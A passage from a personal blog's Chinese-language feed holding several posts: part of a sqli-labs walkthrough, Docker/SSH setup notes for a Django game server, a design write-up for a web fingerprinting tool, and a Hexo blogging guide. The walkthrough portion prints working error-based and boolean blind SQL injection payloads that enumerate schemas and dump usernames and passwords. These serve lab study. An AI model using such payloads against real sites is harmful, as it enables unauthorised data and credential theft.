security.users</code></li></ul></li><li>注意<ul><li>1 尽量都在 sql 语句外面加一个括号，不然可能会报语法错误</li><li>2 如果有时候没有返回值，可以使用<code>limit</code>或者<code>substring</code><ul><li>推荐<code>substring</code></li></ul></li><li>3 三种报错注入方式中，<code>updatexml</code>感觉是最方便的，简单且好打字</li></ul></li></ul><h3 id="L6-报错注入-or-布尔盲注"><a href="#L6-报错注入-or-布尔盲注" class="headerlink" title="L6 报错注入 or 布尔盲注"></a>L6 报错注入 or 布尔盲注</h3><p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&quot;0,\&quot;),\&quot;,))&#39;\&quot;&quot;&lt;/font&gt;</code></p><h4 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h4><ul><li>双引号报错<code>&quot;</code>，闭合符号不一样</li><li>测试数据类型<ul><li><code>?id=1 and 1=1--+</code>不报错</li><li><code>?id=1 and 1=2--+</code>不报错</li><li>字符类型</li></ul></li></ul><h4 id="报错注入payload"><a href="#报错注入payload" class="headerlink" title="报错注入payload"></a>报错注入payload</h4><p>和第五关一样，换成<code>&quot;</code>闭合即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前数据库、版本、用户</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x3a,database(),0x3a,version(),user()))--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/f669b812f040b2e908fa220bd8c87055.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有哪些数据库</span><br><span class="line">?id=1&quot; and extractvalue(1,substring((select group_concat(schema_name) from information_schema.schemata),35,32))--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/19b0ba6cf1363cbee14ac21fa4321b50.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查security数据库中有什么表</span><br><span class="line">?id=1&quot; and extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/c049ce2ab5f51e10801464f4c0ce6fca.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查security数据库中的users表有哪些表项</span><br><span class="line">?id=1&quot; and extractvalue(1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/64516c9c43a32c60349f632560af5414.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查security.users中的username和password中的内容</span><br><span class="line">?id=1&quot; and extractvalue(1,substring((select group_concat(concat_ws(&#x27;:&#x27;,username,password)) from security.users),1,32))--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/c67f74e8230986bcf419ee99c98fe545.png"></p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>手动注入太麻烦了，不推荐</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#判断当前数据库长度</span><br><span class="line">?id=12&#x27;   and (select length(database())&gt;5) --+</span><br><span class="line">#判断当前数据库名</span><br><span class="line">?id=12&#x27;   and (select ascii(substr(database(),1,1))&gt;=97) --+</span><br><span class="line">#判断第一个表的表长度</span><br><span class="line">?id=12&#x27;   and (select length(table_name)&gt;5 from information_schema.tables where table_schema=database() limit 0,1) --+</span><br><span class="line">#判断第二个表名</span><br><span class="line">?id=12&#x27;   and (select ascii(substr(table_name,1,1))&gt;97 from information_schema.tables where table_schema=database() limit 1,1) --+</span><br><span class="line">#判断users表的第一个字段长度</span><br><span class="line">?id=12&#x27;   and (select length(column_name)&gt;1 from information_schema.columns  where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1) --+</span><br><span class="line">#判断users表的第一个字段名</span><br><span class="line">?id=12&#x27;   and (select ascii(substr(column_name,1,1))&gt;65 from information_schema.columns  where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1) --+</span><br><span class="line">#判断username列的第一条数据长度</span><br><span class="line">?id=12&#x27;   and (select length(username)&gt;1 from users limit 0,1) --+</span><br><span class="line">#判断username列的第一条数据</span><br><span class="line">?id=12&#x27;   and (select ascii(substr(username,1,1))&gt;=65 from users limit 0,1) --+</span><br></pre></td></tr></table></figure><p>可以用脚本</p><h3 id="L7-GET注入写shell"><a href="#L7-GET注入写shell" class="headerlink" title="L7 GET注入写shell"></a>L7 GET注入写shell</h3>]]></content>
    
    
    <summary type="html">博客部署：Hexo+next8 部署到 github 并设置自购域名解析个性化配置：超级完整的个性化配置评论系统：leancloud+waline+versel 图床：PicGo+Github	同步问题：elog（自动化批量上传） SEO 优化	导航栏配置......参考文档...</summary>
    
    
    
    <category term="安全基础" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Django的Moba游戏</title>
    <link href="http://godice.top/Django%E7%9A%84Moba%E6%B8%B8%E6%88%8F.html"/>
    <id>http://godice.top/Django%E7%9A%84Moba%E6%B8%B8%E6%88%8F.html</id>
    <published>2024-12-20T06:45:00.000Z</published>
    <updated>2025-01-05T04:40:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置docker、git环境、创建项目"><a href="#配置docker、git环境、创建项目" class="headerlink" title="配置docker、git环境、创建项目"></a>配置docker、git环境、创建项目</h2><h3 id="配置登陆"><a href="#配置登陆" class="headerlink" title="配置登陆"></a>配置登陆</h3><p>云服务器 ip<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;47.108.166.13 &lt;/font&gt;</code></p><p>查看配置好 docker 没<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;docker --version&lt;/font&gt;</code></p><p><font style="color:rgb(0, 0, 0);">生成 ssh 登陆密钥</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ssh-keygen &lt;/font&gt;</code></p><p>进入 ssh 目录<code>cd ~/.ssh</code></p><p>配置别名<code>vim config</code></p><p>（这里配置了 Django 的登陆端口是 20001,等会需要将 docker 容器的 22 端口映射到 aliyun 的 20000 端口）</p><p>（然后就可以通过别名，ssh 免密直连 docker）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/d6cec724e59361848371dff2ef7dd5ac.png"></p><p>这里设置：是登陆到新建的用户 godice，而不是 root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser godice</span><br><span class="line">usermod -aG sudo acs 加上sudo权限</span><br></pre></td></tr></table></figure><p>配置免密登陆<code>ssh-copy-id aliyun</code>一路回车</p><h3 id="镜像配置"><a href="#镜像配置" class="headerlink" title="镜像配置"></a>镜像配置</h3><p>现在需要上传 docker 镜像到云服务器、并做好端口映射</p><p>（这里只是上传一个包含了祖传配置文件的镜像，也可以自己配置，问题不大）</p><p>拷贝镜像到云服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/lib/acwing/docker/images</span><br><span class="line">scp django_lesson_1_0.tar aliyun</span><br></pre></td></tr></table></figure><p>查看已导入的镜像<code>docker images</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/e1e9d4a0dd048277f24fa5a64908d387.png"></p><p>查看运行的镜像<code>docker ps -a</code>这里是我 spring 服务器的镜像</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/e8c8b4b53d586faf5ef601047b3120cc.png"></p><p>停止运行的镜像<code>docker stop docker_lesson</code></p><p>删除镜像（需要先停止才能删除）<code>docker rmi 镜像ID</code></p><p>注意：一个镜像可以对应多个 tag，镜像 id 才是唯一标识符，可以把一个镜像对应的 tag 删除很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi django_lesson:1.0</span><br></pre></td></tr></table></figure><p>导入镜像<code>docker load -i django_game.tar</code></p><p>查看镜像<code>docker images</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/1670e1e7513825b90edfe8d7a9f95d72.png"></p><p>对导入的镜像进行重命名<code>docker tag django_lesson:1.0 django_game:v1.0</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a1aae00c6880c01d009d102415e3c604.png"></p><p>删除旧镜像的tag<code>docker rmi django_lesson:1.0</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/e982de8e610dda227c4159467671e92b.png"></p><p>启动镜像<code>docker run -p 20001:22 -p 8000:8000 --name django_game_server -itd django_game:v1.0</code></p><p>（这里把镜像中的 22、8000 端口映射到了本地的 20001、8000 端口）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a25ce03d0f7c7eff3d5e7dae41a1ca1e.png"></p><p>进入容器<code>docker attach django_game_server</code></p><p>添加新用户<code>useradd godice</code></p><p>添加权限<code>usermod -aG sudo godice</code></p><ul><li>注意：<ul><li><code>control+d</code>会直接关闭容器</li><li><code>control+p</code>然后<code>control+q</code>才是挂起容器</li></ul></li></ul><p>去 aliyun 管理规则开启对应端口：20001 和 8000</p><p>首先测试在云服务器是否可以连接本地的 20001（通过他映射到 django_game_server 的 22）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh godice@localhost -p 20001然后输入密码</span><br><span class="line">logout</span><br><span class="line">logout</span><br></pre></td></tr></table></figure><p>logout 两次回到了本地的终端</p><p>之前已经设置了登陆别名<code>ssh django_game</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/8aa5d03e6c6f16a9818c4b26ac9ee26e.png"></p><p>拷贝祖传配置到服务器镜像<code>scp .bashrc .vimrc .tmux.conf django_game:</code></p><ul><li>注意：把一镜像已经生成了容器是无法在里面给他新增加端口的<ul><li>1:把容器 commit 为镜像</li><li>2:用该镜像生成一个新的容器</li></ul></li></ul><p>目前的别名登陆配置如下</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/7ea0f33971f51c7ebeffbc43185f9dc9.png"></p><h3 id="git-换绑定"><a href="#git-换绑定" class="headerlink" title="git 换绑定"></a>git 换绑定</h3><p>（我这里记录的是另一个 git 项目的换仓库绑定，可以跳过看下一个）</p><p>进行 github 项目地址绑定 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;# SnakeAI-BattleArena&quot; &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git branch -M main</span><br><span class="line">git remote add origin https://github.com/godicee/SnakeAI-BattleArena.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure><h3 id="git-仓库初始化"><a href="#git-仓库初始化" class="headerlink" title="git 仓库初始化"></a>git 仓库初始化</h3><p>项目文件夹下初始化 git 仓库<code>git init</code></p><p>把本地公钥复制后存入 github 仓库</p><p>测试 git 是否连接成功<code>ssh -T git@github.com</code></p><h3 id="Django-创建项目"><a href="#Django-创建项目" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h3>]]></content>
    
    
    <summary type="html">---title: Django的Moba游戏categories: 开发项目---配置docker、git环境、创建项目配置登陆云服务器 ip47.108.166.13 查看配置好 docker 没docker --version生成 ssh 登陆密钥ssh-keygen 进入 ssh 目录...</summary>
    
    
    
    <category term="开发项目" scheme="http://godice.top/categories/%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE/"/>
    
    
  </entry>
  
  <entry>
    <title>Djongo/Vue指纹识别系统</title>
    <link href="http://godice.top/Djongo!Vue%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9F.html"/>
    <id>http://godice.top/Djongo!Vue%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9F.html</id>
    <published>2024-12-16T11:03:32.000Z</published>
    <updated>2024-12-20T06:44:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="系统需求分析"><a href="#系统需求分析" class="headerlink" title="系统需求分析"></a>系统需求分析</h2><ul><li>这部分是对于一个：Djongo&#x2F;Vue指纹识别系统的相关情况分析<ul><li>方便更好地了解一个指纹系统的大概功能需求和架构</li></ul></li></ul><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><ul><li>需求分析：<ul><li>识别网站的前端架构、CMS、服务器</li><li>自定义添加指纹</li><li>用户管理（权限管理）</li></ul></li><li>Todo<ul><li>识别处理<ul><li>识别后端编程语言</li><li>识别数据库版本</li><li>识别服务器系统版本</li></ul></li><li>集成：集成第三方 api</li><li>端口扫描</li><li>ai：加入机器学习的识别接口</li></ul></li><li>重构：<ul><li>目前项目是 vue2+Django（很多依赖都是很老的版本）</li><li>计划开发后：重构为 vue3+Django</li><li>把前面的 Todo 全部完成</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/494e4e1814fbe1d65503f409db990e18.png"></p><h3 id="角色分析"><a href="#角色分析" class="headerlink" title="角色分析"></a>角色分析</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/891d9bfc59865f0ef21a34f6ebe0361b.png"></p><ul><li>系统管理员：系统用户管理、规则编辑</li><li>普通管理员：规则编辑</li><li>普通用户：指纹识别功能</li></ul><h3 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h3><ul><li>Windows 下开发，使用 python<ul><li>Pycharm：支持 Djongo 框架</li><li>SQLite：轻型内置数据库<ul><li>本地创建文件即可，后缀：<code>db/sqlite</code>都可以</li></ul></li><li>Navicat：数据库管理工具</li><li>Vscode：写 vue2</li><li>Vision：office 办公组件、用来绘制图形</li></ul></li></ul><h3 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h3><p>B&#x2F;S 架构（Browser、Server），使用 Djongo&amp;Vue3</p><ul><li>Djongo：python 开发 Web 应用的框架</li><li>Requests：python 爬虫工具包</li><li>Vue2：前端框架<ul><li>ElementUI：前端的 UI 框架</li></ul></li></ul><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>后端</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/c70825c3b3977cd65ac9ab3ed4dac861.png"></p><p>前端</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/9a3d4c7d06263ca47c24a34f276c9b1d.png"></p><h3 id="数据库分析"><a href="#数据库分析" class="headerlink" title="数据库分析"></a>数据库分析</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/40bcf375eeca2336728dae9c38c3f48f.png"></p><ul><li>指纹信息：<ul><li>出现位置：title、返回包、页面 html…</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/e6c253353b15d7cb94ab267920ab4ccc.png"></p><h3 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h3><p>系统用户表</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/374ee0e358b5767f0807effaa94fbda3.png"></p><p>应用信息表</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a9f31a09512d46d39e7ac753eb312c95.png"></p><p>指纹表</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/1af3f8265adb1bd3d216fb087c8f402a.png"></p><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p>系统管理员、普通管理员（由系统管理员添加）、普通用户（直接注册）</p><h3 id="页面展示"><a href="#页面展示" class="headerlink" title="页面展示"></a>页面展示</h3><h4 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h4><p><img src="https://raw.githubusercontent.com/godicee/img/main/20eab5a8a5083a123d0ce0eb43722ce5.png"></p><h4 id="用户管理-1"><a href="#用户管理-1" class="headerlink" title="用户管理"></a>用户管理</h4><p>用户管理页面（注意有个+号，超级员可以添加用户）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/39a1c241fbe050e94474a5e56745da1a.png"></p><p>添加用户（注意账号需要唯一）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/0c27ee062eedea92d5151563b1a90afc.png"></p><h4 id="应用管理"><a href="#应用管理" class="headerlink" title="应用管理"></a>应用管理</h4><p>应用管理页面</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/9672ca33d4d2a88224c751cb5c0b7efc.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/82cd104e266e3e5b42180efa6e8cb035.png"></p><p>添加应用</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/34dbc50966dd5c51cf993d979f9ae23e.png">可以选择应用类型（应用名称不能重复）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/34d3597589e5065796d99afe14989af7.png"></p><ul><li>应用的删除和修改<ul><li>修改：可以修改应用相关信息</li><li>删除：如果存在和指纹相关联的内容则无法删除</li></ul></li></ul><h4 id="指纹管理"><a href="#指纹管理" class="headerlink" title="指纹管理"></a>指纹管理</h4><p><img src="https://raw.githubusercontent.com/godicee/img/main/ad5247d5a82959fd2013375dae0fc82f.png"></p><p>可以选择指纹出现的位置进行筛选</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/4e37a844e81559a1238812cd47229a2a.png"></p><p>也可以根据应用类型进行筛选</p><p>添加指纹</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/bc7179b067f489735834c8a27b1d52f3.png"></p><h4 id="指纹查询"><a href="#指纹查询" class="headerlink" title="指纹查询"></a>指纹查询</h4><p><img src="https://raw.githubusercontent.com/godicee/img/main/27696b8c9cb203a2e2aa0e2213808520.png"></p><p>网站请求的时候：注意随机选择生成 UA 头，避免人机检测（从准备好的文本随机选择）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/b43eaef0b5733c545f7ddb286adda658.png"></p><p>指纹识别：根据指纹出现的不同位置，去应用信息里查询其对应应用</p><h2 id="指纹识别学习"><a href="#指纹识别学习" class="headerlink" title="指纹识别学习"></a>指纹识别学习</h2><p><a href="https://github.com/TideSec/TideFinger/blob/master/Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E4%B8%8E%E4%BC%98%E5%8C%96%E5%AE%9E%E7%8E%B0.md">Web指纹识别技术的研究与实现（参考文档）</a></p><p><a href="https://github.com/TideSec/TideFinger?tab=readme-ov-file">TideFinger</a></p><h3 id="常见指纹间检测对象"><a href="#常见指纹间检测对象" class="headerlink" title="常见指纹间检测对象"></a>常见指纹间检测对象</h3><p>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p><p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p><p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p><p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p><p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p><p>6、操作系统信息：比如linux、win2k8、win7、kali、centos等；</p><p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p><p>8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；</p><p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p><p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p><h3 id="常见指纹识别方式"><a href="#常见指纹识别方式" class="headerlink" title="常见指纹识别方式"></a>常见指纹识别方式</h3><ul><li>1 特定文件 md5：选取网站中特定图片、js、css 等静态文件<ul><li>如：favicon.ico、css、logo.ico、js 等一般不会修改的文件</li><li>通过爬虫抓取这些文件、并和规则库中的对比</li></ul></li></ul><p><img src="https://github.com/TideSec/TideFinger/raw/master/images/001.png"></p><ul><li>2 正常页面&#x2F;错误页面中包含的关键字<ul><li>首页&#x2F;特定页面：robots.txt 中，然后用正则匹配关键字<ul><li>Powered by Discuz、dedecms</li></ul></li><li>fuzz 报错，根据报错信息判断 CMS 或中间件信息<ul><li>eg：tomcat 报错页面</li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/8e38069bbc4222278948c7e31dd3aa5e.png"></p><ul><li>3 请求头关键字匹配：根据这些 banner 识别<ul><li>效率很高、但是搜集规则很耗时、而且容易被改掉</li></ul></li><li>识别方式：<ul><li>X-Powered-By</li><li>Cookie：一些 Waf 会包含 360wzws、Safedog、yunsuo</li><li>Server：DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm</li><li>WWW-Authenticate：一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备</li></ul></li></ul><p><font style="color:rgb(240, 246, 252);background-color:rgb(13, 17, 23);"></font></p><ul><li>4URL 中的关键字：wp-includes、dede 等<ul><li>规则库探测对应目录、爬虫分析链接 url、robots.txt、sitemap.xml 分析<ul><li>通过 url 地址判别是否使用了对应 CMS</li><li>eg：wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用&#x2F;solr目录，weblogic可能使用wls-wsat目录等</li></ul></li></ul></li></ul><p><img src="https://github.com/TideSec/TideFinger/raw/master/images/003.png"></p><ul><li>5 开发语言：web开发语言一般常见的有PHP、jsp、aspx、asp等<ul><li>通过爬虫获取动态链接进行直接判断是比较简便的方法。<ul><li>asp规则<code>&lt;a[^&gt;]*?href=(&#39;|&quot;)[^http][^&gt;]*?\.asp(\?|\#|\1)</code>，其他语言可替换相应asp即可</li></ul></li><li>通过<code>X-Powered-By</code>进行识别<ul><li>比较常见的有<code>X-Powered-By: ASP.NET</code>或者<code>X-Powered-By: PHP/7.1.8</code></li></ul></li><li>通过<code>Set-Cookie</code>进行识别<ul><li>这种方法比较常见也很快捷，比如<code>Set-Cookie</code>中包含<code>PHPSSIONID</code>说明是php、包含<code>JSESSIONID</code>说明是java、包含<code>ASP.NET_SessionId</code>说明是aspx等</li></ul></li></ul></li></ul><h2 id="W11scan"><a href="#W11scan" class="headerlink" title="W11scan"></a>W11scan</h2><p><a href="https://github.com/w-digital-scanner/w11scan?tab=readme-ov-file">w11scan的github</a></p><h3 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1从官方镜像源拉取</span><br><span class="line">docker pull boyhack/w11scan</span><br><span class="line">2因为在启动docker的时候会向mongodb添加指纹信息，所以速度会比较慢。用下面的命令查看进度。</span><br><span class="line">docker run -it -p 666:8000 boyhack/w11scan:latest</span><br><span class="line">3打开127.0.0.1:666</span><br></pre></td></tr></table></figure><h3 id="项目架构"><a href="#项目架构" class="headerlink" title="项目架构"></a>项目架构</h3><h2 id="项目重构"><a href="#项目重构" class="headerlink" title="项目重构"></a>项目重构</h2><ul><li>计划使用 Django+Vue3 重构复现该项目，并实现下列功能：</li><li>本来的功能<ul><li>需求分析：</li><li>识别网站的前端架构、CMS、服务器</li><li>自定义添加指纹</li><li>用户管理（权限管理）</li></ul></li><li>Todo<ul><li>识别处理<ul><li>识别后端编程语言</li><li>识别数据库版本</li><li>识别服务器系统版本</li><li>批量识别并导出</li></ul></li><li>端口扫描</li><li>*集成：集成第三方 api</li><li>*ai：加入机器学习的识别接口</li></ul></li></ul><h3 id="创建-git-项目"><a href="#创建-git-项目" class="headerlink" title="创建 git 项目"></a>创建 git 项目</h3><p>在本地生成公钥，上传到 github</p><p>测试是否成功<code>ssh -T git@github.com</code></p><p>随便创建一个文件夹，作为项目文件夹</p><p>初始化 git<code>git init</code></p><p>创建 readme 文件<code>vim readme.md</code></p><p>查看未被 git 收录的文件<code>git status</code></p><p>加入收录范围<code>git add .</code></p><p>保存当前版本<code>git commit -m &quot;创建项目&quot;</code></p><p>上传 git<code>git push</code></p><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>直接 pycharm 安装后，启动<code>python manage.py runserver</code>即可</p><p>创建 app<code>python manage.py startapp ocr</code></p><p>之前只浅学过 spring、裸写 Django 确实不会，感觉得学一下，又开新坑，详见我博客</p><p>分类——</p><h3 id="vue3"><a href="#vue3" class="headerlink" title="vue3"></a>vue3</h3><p>全局安装 vue3<code>npm install -g @vue/cli</code></p><p>全局升级最新版<code>npm update -g @vue/cli</code></p><p>查看版本<code>vue -v</code></p><p>启动<code>vue ui</code></p><p>访问端口创建项目（不选择初始化 git）</p>]]></content>
    
    
    <summary type="html">---title: Djongo/Vue指纹识别系统categories: 安全研发---系统需求分析这部分是对于一个：Djongo/Vue指纹识别系统的相关情况分析方便更好地了解一个指纹系统的大概功能需求和架构需求分析需求分析：识别网站的前端架构、CMS、服务器自定义添加指纹用户管理（权限管...</summary>
    
    
    
    <category term="安全研发" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>全网最详细Hexo+next博客搭建+语雀+github图床+elog全自动化上传+SEO优化+各种优化+leancloud+Waline评论系统</title>
    <link href="http://godice.top/%E5%85%A8%E7%BD%91%E6%9C%80%E8%AF%A6%E7%BB%86Hexo+next%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA+%E8%AF%AD%E9%9B%80+github%E5%9B%BE%E5%BA%8A+elog%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E4%BC%A0+SEO%E4%BC%98%E5%8C%96+%E5%90%84%E7%A7%8D%E4%BC%98%E5%8C%96+leancloud+Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F.html"/>
    <id>http://godice.top/%E5%85%A8%E7%BD%91%E6%9C%80%E8%AF%A6%E7%BB%86Hexo+next%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA+%E8%AF%AD%E9%9B%80+github%E5%9B%BE%E5%BA%8A+elog%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E4%BC%A0+SEO%E4%BC%98%E5%8C%96+%E5%90%84%E7%A7%8D%E4%BC%98%E5%8C%96+leancloud+Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F.html</id>
    <published>2024-12-12T03:24:01.000Z</published>
    <updated>2024-12-13T02:30:24.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>博客部署：Hexo+next8 部署到 github 并设置自购域名解析</li><li>个性化配置：超级完整的个性化配置</li><li>评论系统：leancloud+waline+versel </li><li>图床：PicGo+Github同步问题：elog（自动化批量上传） SEO 优化导航栏配置……</li></ul><p>参考文档如下：</p><p><a href="https://www.duheweb.com/post/20210417143744.html">GitHub Pages + Hexo + NexT + 自定义域名搭建永久有效的个人博客网站并进行SEO</a></p><p><a href="https://cloud.tencent.com/developer/article/1037114">github+hexo+域名解析</a></p><h2 id="博客布置（next5）"><a href="#博客布置（next5）" class="headerlink" title="博客布置（next5）"></a>博客布置（next5）</h2><p>后期上传注意</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elog sync -e .elog.env 用规则代理即可，不用全局（注意clash开启tun）</span><br><span class="line">hexo g -d 直接取消代理，用直连</span><br><span class="line">（具体上传顺序见文末）</span><br><span class="line">（每次上传后，过一段时间才会生效，可以直接hexo server本地看是否生效）</span><br></pre></td></tr></table></figure><h3 id="github-配置"><a href="#github-配置" class="headerlink" title="github 配置"></a>github 配置</h3><p>创建 github 项目</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/3d6a5ee6bd359d66d26c1c2c1ee4bd8b.png"></p><p>ssh 免密登录：发送本地公钥到 github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">生成密钥：</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">一路回车生成到了c/Users/Administrator/.ssh/id_rsa</span><br><span class="line">去复制id_rsa.pub到github：</span><br><span class="line">https://github.com/settings/ssh</span><br><span class="line">改变密钥认证方式：</span><br><span class="line">ssh-keyscan -t ed25519 github.com &gt;&gt; C:\Users\Administrator\.ssh\known_hosts</span><br><span class="line">测试是否成功：</span><br><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/510081ecc6d2361128efab1be29e726f.png"></p><p><font style="color:rgb(85, 85, 